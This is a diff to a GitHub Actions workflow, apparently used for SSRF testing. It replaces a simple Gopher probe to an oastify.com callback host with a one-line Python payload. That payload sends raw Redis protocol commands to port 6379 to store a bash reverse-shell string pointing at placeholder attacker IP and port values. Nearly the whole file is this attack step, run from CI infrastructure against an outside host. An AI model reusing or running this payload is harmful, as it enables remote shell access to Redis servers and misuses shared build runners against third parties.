@@ -1,12 +1,12 @@
-name: Gopher py Test
+name: SSRF Gopher Payload Test
 
 on:
   workflow_dispatch:
 
 jobs:
-  gopher-test:
+  send_gopher_payload:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Attempt Gopher Request
-        run: |
-          python3 -c "import socket; s=socket.create_connection(('e5kqb8a6g6ei9c78bfqc0dz0zr5itjh8.oastify.com', 70)); s.sendall(b'/\r\n'); s.close()"
+      - name: Send raw Gopher payload to Redis on target (one line)
+        run: python3 -c "import socket; s=socket.create_connection(('c6joc6b4h4fgaa86cdra1b0y0p6guii7.oastify.com', 6379)); s.sendall(b'*3\r\n$3\r\nSET\r\n$5\r\nshell\r\n$29\r\nbash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\r\n'); print(s.recv(1024)); s.close()"
